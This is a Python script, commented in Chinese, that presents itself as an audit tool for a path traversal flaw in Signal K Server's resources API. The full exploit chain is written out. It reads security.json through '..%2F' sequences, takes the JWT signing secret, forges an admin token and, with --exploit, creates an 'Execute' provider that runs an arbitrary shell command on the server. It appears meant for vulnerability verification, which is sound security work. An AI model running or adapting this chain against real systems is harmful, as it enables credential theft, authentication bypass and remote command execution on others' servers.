#!/usr/bin/env python3
"""Signal K Server 资源接口路径穿越审计工具.

判定一条链：资源 API 的 GET 接口没有校验 resourceId，用 ../ 逃出资源目录，
读到 <config>/security.json 里的 JWT 签名密钥，再用它伪造 admin token。

只做读取验证，不写文件、不删文件。--exploit 会创建一个 Execute provider
来证明命令执行，需要显式给出 --cmd，且默认不启用。

用法：
  ./signalk-audit.py -u http://127.0.0.1:3000
  ./signalk-audit.py -u http://127.0.0.1:3000 --token JWT
  ./signalk-audit.py -u http://127.0.0.1:3000 --exploit --cmd "id > /tmp/p"
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
import urllib.error
import urllib.request

TYPES = ["notes", "routes", "waypoints", "regions", "charts"]
MAX_DEPTH = 6
UA = "signalk-audit/1.0"


def http(base, path, token=None, method="GET", body=None, timeout=8):
    url = base.rstrip("/") + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("User-Agent", UA)
    if token:
        req.add_header("Authorization", "JWT " + token)
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(65536)
    except urllib.error.HTTPError as e:
        return e.code, e.read(4096)
    except Exception as e:  # 连接层错误单独标记
        return "ERR", str(e).encode()


def json_or_none(raw):
    try:
        return json.loads(raw)
    except Exception:
        return None


def b64url(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def forge(secret, user_id):
    head = b64url(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    claim = b64url(json.dumps({"id": user_id, "iat": int(time.time())}, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), (head + "." + claim).encode(), hashlib.sha256).digest()
    return head + "." + claim + "." + b64url(sig)


def fingerprint(base):
    st, raw = http(base, "/signalk")
    doc = json_or_none(raw) or {}
    return doc.get("server", {}).get("version"), st


def posture(base, token):
    st, raw = http(base, "/skServer/loginStatus", token)
    return st, json_or_none(raw) or {}


def probe(base, token):
    """按资源类型和深度枚举，返回命中列表 [(type, depth, status)]。"""
    hits = []
    for res_type in TYPES:
        for depth in range(1, MAX_DEPTH + 1):
            path = "/signalk/v2/api/resources/%s/%ssecurity.json" % (res_type, "..%2F" * depth)
            st, raw = http(base, path, token)
            doc = json_or_none(raw)
            if st == 200 and isinstance(doc, dict) and "secretKey" in doc:
                hits.append((res_type, depth, st, doc))
                break
            if st in (401, 403):
                # 凭证不足，继续试下一个类型也没意义
                return hits, "denied"
    return hits, "done"


def main():
    ap = argparse.ArgumentParser(description="Signal K Server 资源接口路径穿越审计")
    ap.add_argument("-u", "--url", required=True, help="目标地址，例如 http://127.0.0.1:3000")
    ap.add_argument("--token", help="只读账号的 JWT（默认配置下需要）")
    ap.add_argument("--exploit", action="store_true", help="用泄露的密钥伪造 admin token 并验证")
    ap.add_argument("--cmd", default="id", help="--exploit 时执行的命令，默认 id")
    ap.add_argument("--json", action="store_true", help="以 JSON 输出结果")
    args = ap.parse_args()

    ver, st = fingerprint(args.url)
    print("[*] 目标 %s  版本 %s (HTTP %s)" % (args.url, ver or "未知", st))

    st, info = posture(args.url, args.token)
    print("[*] loginStatus: HTTP %s  authenticationRequired=%s  readOnlyAccess=%s  userLevel=%s"
          % (st, info.get("authenticationRequired"), info.get("readOnlyAccess"), info.get("userLevel")))

    hits, state = probe(args.url, args.token)
    result = {"url": args.url, "version": ver, "posture": info, "traversal": [], "exploit": None}

    if state == "denied":
        print("[-] 读接口要求凭证，当前身份被拒。带 --token 再跑一次。")
        result["verdict"] = "indeterminate"
    elif hits:
        for res_type, depth, _, doc in hits:
            print("[+] %-9s 深度 %d 命中，secretKey 长度 %d" % (res_type, depth, len(doc.get("secretKey", ""))))
            result["traversal"].append({"type": res_type, "depth": depth, "secret_len": len(doc.get("secretKey", ""))})
        result["verdict"] = "vulnerable"
    else:
        print("[ok] 五种资源类型、%d 层深度都没逃出目录。版本 %s 大概率已修。" % (MAX_DEPTH, ver or "?"))
        result["verdict"] = "fixed"

    if args.exploit and hits:
        secret = hits[0][3]["secretKey"]
        tok = forge(secret, "admin")
        st, info2 = posture(args.url, tok)
        admin = info2.get("userLevel") == "admin"
        print("[*] 伪造 admin token: userLevel=%s" % info2.get("userLevel"))
        result["exploit"] = {"admin_token": admin}
        if admin:
            prov = {"id": "sk-audit-provider", "enabled": True, "logging": False, "type": "Execute",
                    "options": {"type": "ws", "dataType": "SignalK", "command": args.cmd}}
            st, raw = http(args.url, "/skServer/providers", tok, "POST", prov)
            print("[*] 创建 Execute provider: HTTP %s %s" % (st, raw[:80].decode(errors="replace")))
            result["exploit"]["provider_status"] = st

    if args.json:
        print(json.dumps(result, ensure_ascii=False, indent=2))
    return 0 if result["verdict"] == "vulnerable" else 1


if __name__ == "__main__":
    sys.exit(main())
